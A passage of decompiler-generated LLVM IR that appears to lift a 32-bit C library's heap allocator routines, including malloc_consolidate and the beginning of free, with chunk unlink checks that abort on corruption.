dec_label_pc_805fc77:                             ; preds = %dec_label_pc_805fc71
  %v0_805fc77 = load i32, i32* %ebp.global-to-local, align 4
  %v1_805fc77 = add i32 %v0_805fc77, 44
  %v2_805fc77 = inttoptr i32 %v1_805fc77 to i32*
  %v3_805fc77 = load i32, i32* %v2_805fc77, align 4
  store i32 %v3_805fc77, i32* %eax.global-to-local, align 4
  %v1_805fc7a = add i32 %v0_805fc77, 872
  %v2_805fc7a = inttoptr i32 %v1_805fc7a to i32*
  %v3_805fc7a = load i32, i32* %v2_805fc7a, align 4
  %v5_805fc7a = sub i32 %v3_805fc7a, %v2_805fc73
  store i32 %v5_805fc7a, i32* %v2_805fc7a, align 4
  %v0_805fc80 = load i32, i32* @esi, align 4
  %v1_805fc80 = load i32, i32* @ecx, align 4
  %v2_805fc80 = sub i32 %v0_805fc80, %v1_805fc80
  %v1_805fc82 = or i32 %v2_805fc80, 1
  %v1_805fc85 = load i32, i32* %eax.global-to-local, align 4
  %v2_805fc85 = add i32 %v1_805fc85, 4
  %v3_805fc85 = inttoptr i32 %v2_805fc85 to i32*
  store i32 %v1_805fc82, i32* %v3_805fc85, align 4
  br label %dec_label_pc_805fc91

dec_label_pc_805fc8f:                             ; preds = %dec_label_pc_805fc71, %dec_label_pc_805fc52, %dec_label_pc_805fc3a, %entry
  br label %dec_label_pc_805fc91

dec_label_pc_805fc91:                             ; preds = %dec_label_pc_805fc77, %dec_label_pc_805fc8f
  %storemerge = phi i32 [ 1, %dec_label_pc_805fc77 ], [ 0, %dec_label_pc_805fc8f ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805fc0f, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805fc64, { 1, 0, 2 }
  uselistorder i32 %v4_805fc33, { 1, 2, 0 }
  uselistorder i32 %v3_805fc15, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_805fc91, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_805fc99 = load i32, i32* @ebp, align 4
  %v0_805fc9a = load i32, i32* @edi, align 4
  %v0_805fc9b = load i32, i32* @esi, align 4
  %v0_805fc9c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_805fca4 = load i32, i32* %arg1, align 4
  store i32 %v2_805fca4, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_805fcab = icmp eq i32 %v2_805fca4, 0
  br i1 %v1_805fcab, label %dec_label_pc_805fdd4.preheader, label %dec_label_pc_805fcb3

dec_label_pc_805fdd4.preheader:                   ; preds = %entry
  %v3_805fdc9 = add i32 %tmp11, 44
  br label %dec_label_pc_805fdc5

dec_label_pc_805fcb3:                             ; preds = %entry
  %v1_805fcb7 = and i32 %v2_805fca4, -3
  store i32 %v1_805fcb7, i32* %arg1, align 4
  %v1_805fcbc = add i32 %tmp11, 52
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_805fcd8 = udiv i32 %v1_805fcb7, 8
  %v2_805fcdb = mul nuw i32 %v2_805fcd8, 4
  %v3_805fcdb = add i32 %tmp11, -4
  %v4_805fcdb = add i32 %v3_805fcdb, %v2_805fcdb
  store i32 %v4_805fcdb, i32* %eax.global-to-local, align 4
  %v2_805fda2 = add i32 %tmp11, 44
  %v3_805fda2 = inttoptr i32 %v2_805fda2 to i32*
  %v1_805fd75 = add i32 %tmp11, 60
  %v2_805fd75 = inttoptr i32 %v1_805fd75 to i32*
  br label %dec_label_pc_805fce3

dec_label_pc_805fce3:                             ; preds = %dec_label_pc_805fdbb, %dec_label_pc_805fcb3
  %v0_805fcf1.in = phi i32 [ %tmp11, %dec_label_pc_805fcb3 ], [ %v0_805fcf1, %dec_label_pc_805fdbb ]
  %v0_805fcf1 = add i32 %v0_805fcf1.in, 4
  store i32 %v0_805fcf1, i32* %eax.global-to-local, align 4
  %v1_805fce7 = inttoptr i32 %v0_805fcf1 to i32*
  %v2_805fce7 = load i32, i32* %v1_805fce7, align 4
  store i32 %v2_805fce7, i32* @ecx, align 4
  %v1_805fce9 = icmp eq i32 %v2_805fce7, 0
  br i1 %v1_805fce9, label %dec_label_pc_805fdb1, label %dec_label_pc_805fcf1

dec_label_pc_805fcf1:                             ; preds = %dec_label_pc_805fce3
  store i32 0, i32* %v1_805fce7, align 4
  %v0_805fcf7.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805fcf7

dec_label_pc_805fcf7:                             ; preds = %dec_label_pc_805fda5, %dec_label_pc_805fcf1
  %v0_805fd14 = phi i32 [ %v3_805fcf7, %dec_label_pc_805fda5 ], [ %v0_805fcf7.pre, %dec_label_pc_805fcf1 ]
  %v1_805fcf7 = add i32 %v0_805fd14, 8
  %v2_805fcf7 = inttoptr i32 %v1_805fcf7 to i32*
  %v3_805fcf7 = load i32, i32* %v2_805fcf7, align 4
  store i32 %v3_805fcf7, i32* %edx.global-to-local, align 4
  %v1_805fcfe = add i32 %v0_805fd14, 4
  %v2_805fcfe = inttoptr i32 %v1_805fcfe to i32*
  %v3_805fcfe = load i32, i32* %v2_805fcfe, align 4
  store i32 %v3_805fcfe, i32* %eax.global-to-local, align 4
  %v1_805fd03 = and i32 %v3_805fcfe, -2
  store i32 %v1_805fd03, i32* @edi, align 4
  %v2_805fd06 = urem i32 %v3_805fcfe, 2
  %v3_805fd06 = icmp eq i32 %v2_805fd06, 0
  %v2_805fd08 = add i32 %v1_805fd03, %v0_805fd14
  store i32 %v2_805fd08, i32* @ebx, align 4
  %v1_805fd0b = add i32 %v2_805fd08, 4
  %v2_805fd0b = inttoptr i32 %v1_805fd0b to i32*
  %v3_805fd0b = load i32, i32* %v2_805fd0b, align 4
  store i32 %v3_805fd0b, i32* %edx.global-to-local, align 4
  %v1_805fd12 = icmp eq i1 %v3_805fd06, false
  br i1 %v1_805fd12, label %dec_label_pc_805fd34, label %dec_label_pc_805fd14

dec_label_pc_805fd14:                             ; preds = %dec_label_pc_805fcf7
  %v1_805fd14 = inttoptr i32 %v0_805fd14 to i32*
  %v2_805fd14 = load i32, i32* %v1_805fd14, align 4
  store i32 %v2_805fd14, i32* @ebp, align 4
  %v2_805fd18 = sub i32 %v0_805fd14, %v2_805fd14
  store i32 %v2_805fd18, i32* %eax.global-to-local, align 4
  %v1_805fd1a = add i32 %v2_805fd18, 8
  %v2_805fd1a = inttoptr i32 %v1_805fd1a to i32*
  %v3_805fd1a = load i32, i32* %v2_805fd1a, align 4
  store i32 %v3_805fd1a, i32* @esi, align 4
  %v1_805fd1d = add i32 %v2_805fd18, 12
  %v2_805fd1d = inttoptr i32 %v1_805fd1d to i32*
  %v3_805fd1d = load i32, i32* %v2_805fd1d, align 4
  store i32 %v3_805fd1d, i32* %edx.global-to-local, align 4
  %v1_805fd20 = add i32 %v3_805fd1a, 12
  %v2_805fd20 = inttoptr i32 %v1_805fd20 to i32*
  %v3_805fd20 = load i32, i32* %v2_805fd20, align 4
  store i32 %v3_805fd20, i32* @ecx, align 4
  %v12_805fd23 = icmp eq i32 %v3_805fd20, %v2_805fd18
  %v1_805fd25 = icmp eq i1 %v12_805fd23, false
  br i1 %v1_805fd25, label %dec_label_pc_805fd64, label %dec_label_pc_805fd27

dec_label_pc_805fd27:                             ; preds = %dec_label_pc_805fd14
  %v1_805fd27 = add i32 %v3_805fd1d, 8
  %v2_805fd27 = inttoptr i32 %v1_805fd27 to i32*
  %v3_805fd27 = load i32, i32* %v2_805fd27, align 4
  %v15_805fd27 = icmp eq i32 %v3_805fd27, %v3_805fd20
  %v1_805fd2a = icmp eq i1 %v15_805fd27, false
  br i1 %v1_805fd2a, label %dec_label_pc_805fd64, label %dec_label_pc_805fd2c

dec_label_pc_805fd2c:                             ; preds = %dec_label_pc_805fd27
  %v2_805fd2c = add i32 %v2_805fd14, %v1_805fd03
  store i32 %v2_805fd2c, i32* @edi, align 4
  store i32 %v3_805fd1d, i32* %v2_805fd20, align 4
  %v0_805fd31 = load i32, i32* @esi, align 4
  %v1_805fd31 = load i32, i32* %edx.global-to-local, align 4
  %v2_805fd31 = add i32 %v1_805fd31, 8
  %v3_805fd31 = inttoptr i32 %v2_805fd31 to i32*
  store i32 %v0_805fd31, i32* %v3_805fd31, align 4
  %v0_805fd3f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805fd34

dec_label_pc_805fd34:                             ; preds = %dec_label_pc_805fcf7, %dec_label_pc_805fd2c
  %v1_805fd48 = phi i32 [ %v2_805fd08, %dec_label_pc_805fcf7 ], [ %v0_805fd3f.pre, %dec_label_pc_805fd2c ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_805fd3c = and i32 %v3_805fd0b, -4
  store i32 %v1_805fd3c, i32* @ebp, align 4
  %v4_805fd3f = load i32, i32* %v3_805fda2, align 4
  %v15_805fd3f = icmp eq i32 %v1_805fd48, %v4_805fd3f
  br i1 %v15_805fd3f, label %dec_label_pc_805fd95, label %dec_label_pc_805fd44

dec_label_pc_805fd44:                             ; preds = %dec_label_pc_805fd34
  %v2_805fd44 = add i32 %v1_805fd48, 4
  %v3_805fd44 = add i32 %v2_805fd44, %v1_805fd3c
  %v4_805fd44 = inttoptr i32 %v3_805fd44 to i32*
  %v5_805fd44 = load i32, i32* %v4_805fd44, align 4
  store i32 %v5_805fd44, i32* %eax.global-to-local, align 4
  %v3_805fd48 = inttoptr i32 %v2_805fd44 to i32*
  store i32 %v1_805fd3c, i32* %v3_805fd48, align 4
  %v0_805fd4b = load i32, i32* %eax.global-to-local, align 4
  %v1_805fd4b = urem i32 %v0_805fd4b, 2
  %v2_805fd4b = icmp eq i32 %v1_805fd4b, 0
  store i32 %v1_805fd4b, i32* %eax.global-to-local, align 4
  %v1_805fd50 = icmp eq i1 %v2_805fd4b, false
  br i1 %v1_805fd50, label %dec_label_pc_805fd71, label %dec_label_pc_805fd52

dec_label_pc_805fd52:                             ; preds = %dec_label_pc_805fd44
  %v0_805fd52 = load i32, i32* @ebx, align 4
  %v1_805fd52 = add i32 %v0_805fd52, 8
  %v2_805fd52 = inttoptr i32 %v1_805fd52 to i32*
  %v3_805fd52 = load i32, i32* %v2_805fd52, align 4
  store i32 %v3_805fd52, i32* @edx, align 4
  %v1_805fd55 = add i32 %v0_805fd52, 12
  %v2_805fd55 = inttoptr i32 %v1_805fd55 to i32*
  %v3_805fd55 = load i32, i32* %v2_805fd55, align 4
  store i32 %v3_805fd55, i32* %eax.global-to-local, align 4
  %v1_805fd58 = add i32 %v3_805fd52, 12
  %v2_805fd58 = inttoptr i32 %v1_805fd58 to i32*
  %v3_805fd58 = load i32, i32* %v2_805fd58, align 4
  store i32 %v3_805fd58, i32* @esi, align 4
  %v12_805fd5b = icmp eq i32 %v3_805fd58, %v0_805fd52
  %v1_805fd5d = icmp eq i1 %v12_805fd5b, false
  br i1 %v1_805fd5d, label %dec_label_pc_805fd64, label %dec_label_pc_805fd5f

dec_label_pc_805fd5f:                             ; preds = %dec_label_pc_805fd52
  %v1_805fd5f = add i32 %v3_805fd55, 8
  %v2_805fd5f = inttoptr i32 %v1_805fd5f to i32*
  %v3_805fd5f = load i32, i32* %v2_805fd5f, align 4
  %v15_805fd5f = icmp eq i32 %v3_805fd5f, %v3_805fd58
  br i1 %v15_805fd5f, label %dec_label_pc_805fd69, label %dec_label_pc_805fd64

dec_label_pc_805fd64:                             ; preds = %dec_label_pc_805fd5f, %dec_label_pc_805fd52, %dec_label_pc_805fd27, %dec_label_pc_805fd14
  %v0_805fd64 = call i32 @abort()
  store i32 %v0_805fd64, i32* %eax.global-to-local, align 4
  %v1_805fd6b.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805fd69

dec_label_pc_805fd69:                             ; preds = %dec_label_pc_805fd5f, %dec_label_pc_805fd64
  %v1_805fd6b = phi i32 [ %v3_805fd52, %dec_label_pc_805fd5f ], [ %v1_805fd6b.pre, %dec_label_pc_805fd64 ]
  %v0_805fd6b = phi i32 [ %v3_805fd55, %dec_label_pc_805fd5f ], [ %v0_805fd64, %dec_label_pc_805fd64 ]
  %v0_805fd69 = load i32, i32* @edi, align 4
  %v1_805fd69 = load i32, i32* @ebp, align 4
  %v2_805fd69 = add i32 %v1_805fd69, %v0_805fd69
  store i32 %v2_805fd69, i32* @edi, align 4
  %v2_805fd6b = add i32 %v1_805fd6b, 12
  %v3_805fd6b = inttoptr i32 %v2_805fd6b to i32*
  store i32 %v0_805fd6b, i32* %v3_805fd6b, align 4
  %v0_805fd6e = load i32, i32* @edx, align 4
  %v1_805fd6e = load i32, i32* %eax.global-to-local, align 4
  %v2_805fd6e = add i32 %v1_805fd6e, 8
  %v3_805fd6e = inttoptr i32 %v2_805fd6e to i32*
  store i32 %v0_805fd6e, i32* %v3_805fd6e, align 4
  br label %dec_label_pc_805fd71

dec_label_pc_805fd71:                             ; preds = %dec_label_pc_805fd44, %dec_label_pc_805fd69
  store i32 %v1_805fcbc, i32* %eax.global-to-local, align 4
  %v3_805fd75 = load i32, i32* %v2_805fd75, align 4
  store i32 %v3_805fd75, i32* %edx.global-to-local, align 4
  %v0_805fd78 = load i32, i32* @ecx, align 4
  store i32 %v0_805fd78, i32* %v2_805fd75, align 4
  %v0_805fd7b = load i32, i32* @edi, align 4
  %v1_805fd7d = or i32 %v0_805fd7b, 1
  store i32 %v1_805fd7d, i32* %eax.global-to-local, align 4
  %v0_805fd80 = load i32, i32* @ecx, align 4
  %v1_805fd80 = load i32, i32* %edx.global-to-local, align 4
  %v2_805fd80 = add i32 %v1_805fd80, 12
  %v3_805fd80 = inttoptr i32 %v2_805fd80 to i32*
  store i32 %v0_805fd80, i32* %v3_805fd80, align 4
  %v0_805fd83 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fd83 = load i32, i32* @ecx, align 4
  %v2_805fd83 = add i32 %v1_805fd83, 4
  %v3_805fd83 = inttoptr i32 %v2_805fd83 to i32*
  store i32 %v0_805fd83, i32* %v3_805fd83, align 4
  store i32 %v1_805fcbc, i32* %eax.global-to-local, align 4
  %v0_805fd8a = load i32, i32* %edx.global-to-local, align 4
  %v1_805fd8a = load i32, i32* @ecx, align 4
  %v2_805fd8a = add i32 %v1_805fd8a, 8
  %v3_805fd8a = inttoptr i32 %v2_805fd8a to i32*
  store i32 %v0_805fd8a, i32* %v3_805fd8a, align 4
  %v0_805fd8d = load i32, i32* %eax.global-to-local, align 4
  %v1_805fd8d = load i32, i32* @ecx, align 4
  %v2_805fd8d = add i32 %v1_805fd8d, 12
  %v3_805fd8d = inttoptr i32 %v2_805fd8d to i32*
  store i32 %v0_805fd8d, i32* %v3_805fd8d, align 4
  %v0_805fd90 = load i32, i32* @edi, align 4
  %v1_805fd90 = load i32, i32* @ecx, align 4
  %v3_805fd90 = add i32 %v1_805fd90, %v0_805fd90
  %v4_805fd90 = inttoptr i32 %v3_805fd90 to i32*
  store i32 %v0_805fd90, i32* %v4_805fd90, align 4
  br label %dec_label_pc_805fda5

dec_label_pc_805fd95:                             ; preds = %dec_label_pc_805fd34
  %v0_805fd95 = load i32, i32* @edi, align 4
  %v2_805fd95 = add i32 %v0_805fd95, %v1_805fd3c
  %v1_805fd98 = or i32 %v2_805fd95, 1
  store i32 %v1_805fd98, i32* %eax.global-to-local, align 4
  %v1_805fd9b = load i32, i32* @ecx, align 4
  %v2_805fd9b = add i32 %v1_805fd9b, 4
  %v3_805fd9b = inttoptr i32 %v2_805fd9b to i32*
  store i32 %v1_805fd98, i32* %v3_805fd9b, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v0_805fda2 = load i32, i32* @ecx, align 4
  store i32 %v0_805fda2, i32* %v3_805fda2, align 4
  br label %dec_label_pc_805fda5

dec_label_pc_805fda5:                             ; preds = %dec_label_pc_805fd71, %dec_label_pc_805fd95
  store i32 %v3_805fcf7, i32* @ecx, align 4
  %v1_805fda9 = icmp eq i32 %v3_805fcf7, 0
  %v1_805fdab = icmp eq i1 %v1_805fda9, false
  br i1 %v1_805fdab, label %dec_label_pc_805fcf7, label %dec_label_pc_805fdb1

dec_label_pc_805fdb1:                             ; preds = %dec_label_pc_805fda5, %dec_label_pc_805fce3
  store i32 %v4_805fcdb, i32* @ecx, align 4
  %v15_805fdb5 = icmp eq i32 %v0_805fcf1, %v4_805fcdb
  br i1 %v15_805fdb5, label %dec_label_pc_805fe39, label %dec_label_pc_805fdbb

dec_label_pc_805fdbb:                             ; preds = %dec_label_pc_805fdb1
  br label %dec_label_pc_805fce3

dec_label_pc_805fdc5:                             ; preds = %dec_label_pc_805fdd4.preheader, %dec_label_pc_805fdc5
  %v1_805fdc920 = phi i32 [ 1, %dec_label_pc_805fdd4.preheader ], [ %v0_805fdd4.pre, %dec_label_pc_805fdc5 ]
  %v2_805fdc9 = mul i32 %v1_805fdc920, 8
  %v4_805fdc9 = add i32 %v3_805fdc9, %v2_805fdc9
  store i32 %v4_805fdc9, i32* %eax.global-to-local, align 4
  %v1_805fdcd = add i32 %v1_805fdc920, 1
  store i32 %v1_805fdcd, i32* %edx.global-to-local, align 4
  %v2_805fdce = add i32 %v4_805fdc9, 12
  %v3_805fdce = inttoptr i32 %v2_805fdce to i32*
  store i32 %v4_805fdc9, i32* %v3_805fdce, align 4
  %v0_805fdd1 = load i32, i32* %eax.global-to-local, align 4
  %v2_805fdd1 = add i32 %v0_805fdd1, 8
  %v3_805fdd1 = inttoptr i32 %v2_805fdd1 to i32*
  store i32 %v0_805fdd1, i32* %v3_805fdd1, align 4
  %v0_805fdd4.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_805fdd7 = icmp sgt i32 %v0_805fdd4.pre, 95
  br i1 %v7_805fdd7, label %dec_label_pc_805fdd9, label %dec_label_pc_805fdc5

dec_label_pc_805fdd9:                             ; preds = %dec_label_pc_805fdc5
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_805fddd = add i32 %tmp11, 864
  %v2_805fddd = inttoptr i32 %v1_805fddd to i32*
  %v3_805fddd = load i32, i32* %v2_805fddd, align 4
  %v4_805fddd = or i32 %v3_805fddd, 1
  store i32 %v4_805fddd, i32* %v2_805fddd, align 4
  %v0_805fde4 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fde4 = add i32 %v0_805fde4, 840
  %v2_805fde4 = inttoptr i32 %v1_805fde4 to i32*
  store i32 0, i32* %v2_805fde4, align 4
  %v0_805fdee = load i32, i32* %eax.global-to-local, align 4
  %v1_805fdee = add i32 %v0_805fdee, 852
  %v2_805fdee = inttoptr i32 %v1_805fdee to i32*
  store i32 65536, i32* %v2_805fdee, align 4
  %v0_805fdf8 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fdf8 = add i32 %v0_805fdf8, 844
  %v2_805fdf8 = inttoptr i32 %v1_805fdf8 to i32*
  store i32 262144, i32* %v2_805fdf8, align 4
  %v0_805fe02 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fe02 = add i32 %v0_805fe02, 836
  %v2_805fe02 = inttoptr i32 %v1_805fe02 to i32*
  store i32 262144, i32* %v2_805fe02, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_805fe13 = load i32, i32* %arg1, align 4
  %v1_805fe15 = urem i32 %v2_805fe13, 4
  %v1_805fe18 = or i32 %v1_805fe15, 72
  store i32 %v1_805fe18, i32* %arg1, align 4
  %v1_805fe1f = add i32 %tmp11, 52
  store i32 %v1_805fe1f, i32* %eax.global-to-local, align 4
  %v2_805fe22 = add i32 %tmp11, 44
  %v3_805fe22 = inttoptr i32 %v2_805fe22 to i32*
  store i32 %v1_805fe1f, i32* %v3_805fe22, align 4
  %v1_805fe27 = call i32 @sysconf(i32 30)
  store i32 %v1_805fe27, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_805fe33 = add i32 %tmp11, 860
  %v3_805fe33 = inttoptr i32 %v2_805fe33 to i32*
  store i32 %v1_805fe27, i32* %v3_805fe33, align 4
  br label %dec_label_pc_805fe39

dec_label_pc_805fe39:                             ; preds = %dec_label_pc_805fdb1, %dec_label_pc_805fdd9
  store i32 %v0_805fc9c, i32* @ebx, align 4
  store i32 %v0_805fc9b, i32* @esi, align 4
  store i32 %v0_805fc9a, i32* @edi, align 4
  store i32 %v0_805fc99, i32* @ebp, align 4
  %v0_805fe40 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805fe40

; uselistorder directives
  uselistorder i32 %v0_805fdd1, { 1, 0 }
  uselistorder i32 %v0_805fd90, { 1, 0 }
  uselistorder i32 %v1_805fd4b, { 1, 0 }
  uselistorder i32 %v2_805fd44, { 1, 0 }
  uselistorder i32 %v1_805fd3c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805fd48, { 1, 0 }
  uselistorder i32 %v3_805fcf7, { 2, 1, 3, 0 }
  uselistorder i32 %v0_805fd14, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805fcf1, { 2, 0, 1, 3 }
  uselistorder i32* %v3_805fda2, { 1, 0 }
  uselistorder i32 %v1_805fcbc, { 1, 0 }
  uselistorder i32 %tmp11, { 6, 16, 2, 1, 15, 13, 12, 10, 9, 0, 4, 11, 5, 8, 3, 14, 7 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_805fe39, { 1, 0 }
  uselistorder label %dec_label_pc_805fdc5, { 1, 0 }
  uselistorder label %dec_label_pc_805fda5, { 1, 0 }
  uselistorder label %dec_label_pc_805fd71, { 1, 0 }
  uselistorder label %dec_label_pc_805fd69, { 1, 0 }
  uselistorder label %dec_label_pc_805fd34, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805fe41 = load i32, i32* @ebp, align 4
  %v0_805fe42 = load i32, i32* @edi, align 4
  %v0_805fe43 = load i32, i32* @esi, align 4
  %v0_805fe44 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805fe4c = icmp eq i32 %arg1, 0
  br i1 %v1_805fe4c, label %dec_label_pc_805ffd5, label %dec_label_pc_805fe54

dec_label_pc_805fe54:                             ; preds = %entry
  %v2_805fe5f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805fe5f, i32* %eax.global-to-local, align 4
  %v4_805fe64 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_8074750.648 to i32))
  store i32 %v4_805fe64, i32* %eax.global-to-local, align 4
  %v1_805fe70 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074750.648 to i32))
  %v1_805fe75 = add i32 %arg1, -8
  store i32 %v1_805fe75, i32* @ecx, align 4
  %v0_805fe78 = load i8, i8* @global_var_807e620.732, align 1
  %v1_805fe78 = sext i8 %v0_805fe78 to i32
  store i32 %v1_805fe78, i32* %eax.global-to-local, align 4
  %v1_805fe80 = add i32 %arg1, -4
  %v2_805fe80 = inttoptr i32 %v1_805fe80 to i32*
  %v3_805fe80 = load i32, i32* %v2_805fe80, align 4
  store i32 %v3_805fe80, i32* %edx.global-to-local, align 4
  %v1_805fe85 = and i32 %v3_805fe80, -4
  %v4_805fe85 = trunc i32 %v1_805fe85 to i8
  store i32 %v1_805fe85, i32* @ebx, align 4
  %v8_805fe8a = icmp ugt i8 %v4_805fe85, %v0_805fe78
  br i1 %v8_805fe8a, label %dec_label_pc_805feac, label %dec_label_pc_805fe8c

dec_label_pc_805fe8c:                             ; preds = %dec_label_pc_805fe54
  %v2_805fe8c = udiv i32 %v3_805fe80, 8
  store i32 %v2_805fe8c, i32* @ebx, align 4
  %v1_805fe8f = or i32 %v1_805fe78, 3
  %v3_805fe8f = trunc i32 %v1_805fe8f to i8
  store i32 %v1_805fe8f, i32* %eax.global-to-local, align 4
  store i8 %v3_805fe8f, i8* @global_var_807e620.732, align 32
  %v1_805fe97 = mul nuw i32 %v2_805fe8c, 4
  %v2_805fe97 = add i32 %v1_805fe97, ptrtoint (i8* @global_var_807e620.732 to i32)
  store i32 %v2_805fe97, i32* %edx.global-to-local, align 4
  %v1_805fe9e = add i32 %v1_805fe97, add (i32 ptrtoint (i8* @global_var_807e620.732 to i32), i32 -4)
  %v2_805fe9e = inttoptr i32 %v1_805fe9e to i32*
  %v3_805fe9e = load i32, i32* %v2_805fe9e, align 4
  store i32 %v3_805fe9e, i32* %eax.global-to-local, align 4
  %v3_805fea1 = inttoptr i32 %arg1 to i32*
  store i32 %v3_805fe9e, i32* %v3_805fea1, align 4
  %v0_805fea4 = load i32, i32* @ecx, align 4
  %v1_805fea4 = load i32, i32* %edx.global-to-local, align 4
  %v2_805fea4 = add i32 %v1_805fea4, -4
  %v3_805fea4 = inttoptr i32 %v2_805fea4 to i32*
  store i32 %v0_805fea4, i32* %v3_805fea4, align 4
  br label %dec_label_pc_805ffc4

dec_label_pc_805feac:                             ; preds = %dec_label_pc_805fe54
  %v1_805feac = trunc i32 %v3_805fe80 to i8
  %v2_805feac = and i8 %v1_805feac, 2
  %v3_805feac = icmp eq i8 %v2_805feac, 0
  %v5_805feac = zext i8 %v2_805feac to i32
  %v7_805feac = and i32 %v3_805fe80, -256
  %v8_805feac = or i32 %v5_805feac, %v7_805feac
  store i32 %v8_805feac, i32* %edx.global-to-local, align 4
  %v1_805feaf = icmp eq i1 %v3_805feac, false
  br i1 %v1_805feaf, label %dec_label_pc_805ffa4, label %dec_label_pc_805feb5

dec_label_pc_805feb5:                             ; preds = %dec_label_pc_805feac
  %v1_805feb5 = or i32 %v1_805fe78, 1
  %v3_805feb5 = trunc i32 %v1_805feb5 to i8
  store i32 %v1_805feb5, i32* %eax.global-to-local, align 4
  %v2_805feb8 = add i32 %v1_805fe85, %v1_805fe75
  store i32 %v2_805feb8, i32* @esi, align 4
  store i8 %v3_805feb5, i8* @global_var_807e620.732, align 32
  %v1_805fec0 = add i32 %v2_805feb8, 4
  %v2_805fec0 = inttoptr i32 %v1_805fec0 to i32*
  %v3_805fec0 = load i32, i32* %v2_805fec0, align 4
  store i32 %v3_805fec0, i32* %eax.global-to-local, align 4
  %v2_805fec7 = inttoptr i32 %v1_805fe80 to i8*
  %v3_805fec7 = load i8, i8* %v2_805fec7, align 1
  %v4_805fec7 = urem i8 %v3_805fec7, 2
  %v5_805fec7 = icmp eq i8 %v4_805fec7, 0
  %v1_805fecb = icmp eq i1 %v5_805fec7, false
  br i1 %v1_805fecb, label %dec_label_pc_805feee, label %dec_label_pc_805fecd

dec_label_pc_805fecd:                             ; preds = %dec_label_pc_805feb5
  %v2_805fecd = inttoptr i32 %v1_805fe75 to i32*
  %v3_805fecd = load i32, i32* %v2_805fecd, align 4
  store i32 %v3_805fecd, i32* @ebp, align 4
  %v2_805fed2 = sub i32 %v1_805fe75, %v3_805fecd
  store i32 %v2_805fed2, i32* %eax.global-to-local, align 4
  %v1_805fed4 = add i32 %v2_805fed2, 8
  %v2_805fed4 = inttoptr i32 %v1_805fed4 to i32*
  %v3_805fed4 = load i32, i32* %v2_805fed4, align 4
  store i32 %v3_805fed4, i32* @edi, align 4
  %v1_805fed7 = add i32 %v2_805fed2, 12
  %v2_805fed7 = inttoptr i32 %v1_805fed7 to i32*
  %v3_805fed7 = load i32, i32* %v2_805fed7, align 4
  store i32 %v3_805fed7, i32* %edx.global-to-local, align 4
  %v1_805feda = add i32 %v3_805fed4, 12
  %v2_805feda = inttoptr i32 %v1_805feda to i32*
  %v3_805feda = load i32, i32* %v2_805feda, align 4
  store i32 %v3_805feda, i32* @ecx, align 4
  %v12_805fedd = icmp eq i32 %v3_805feda, %v2_805fed2
  %v1_805fedf = icmp eq i1 %v12_805fedd, false
  br i1 %v1_805fedf, label %dec_label_pc_805ff1d, label %dec_label_pc_805fee1

dec_label_pc_805fee1:                             ; preds = %dec_label_pc_805fecd
  %v1_805fee1 = add i32 %v3_805fed7, 8
  %v2_805fee1 = inttoptr i32 %v1_805fee1 to i32*
  %v3_805fee1 = load i32, i32* %v2_805fee1, align 4
  %v15_805fee1 = icmp eq i32 %v3_805fee1, %v3_805feda
  %v1_805fee4 = icmp eq i1 %v15_805fee1, false
  br i1 %v1_805fee4, label %dec_label_pc_805ff1d, label %dec_label_pc_805fee6

dec_label_pc_805fee6:                             ; preds = %dec_label_pc_805fee1
  %v2_805fee6 = add i32 %v3_805fecd, %v1_805fe85
  store i32 %v2_805fee6, i32* @ebx, align 4
  store i32 %v3_805fed7, i32* %v2_805feda, align 4
  %v0_805feeb = load i32, i32* @edi, align 4
  %v1_805feeb = load i32, i32* %edx.global-to-local, align 4
  %v2_805feeb = add i32 %v1_805feeb, 8
  %v3_805feeb = inttoptr i32 %v2_805feeb to i32*
  store i32 %v0_805feeb, i32* %v3_805feeb, align 4
  %v0_805fef5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805feee

dec_label_pc_805feee:                             ; preds = %dec_label_pc_805feb5, %dec_label_pc_805fee6
  %v1_805ff01 = phi i32 [ %v2_805feb8, %dec_label_pc_805feb5 ], [ %v0_805fef5.pre, %dec_label_pc_805fee6 ]
  %v1_805fef2 = and i32 %v3_805fec0, -4
